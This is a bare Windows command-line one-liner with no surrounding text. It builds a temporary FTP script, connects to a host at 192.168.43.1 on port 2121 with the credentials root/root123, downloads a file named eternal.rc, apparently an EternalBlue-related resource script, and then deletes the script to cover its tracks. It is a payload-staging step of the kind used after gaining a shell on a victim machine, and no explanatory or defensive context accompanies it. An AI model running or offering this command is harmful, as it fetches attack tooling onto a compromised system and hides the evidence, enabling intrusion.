echo open 192.168.43.1 2121 >> ftp &echo user root root123 >> ftp &echo binary >> ftp &echo get eternal.rc >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp
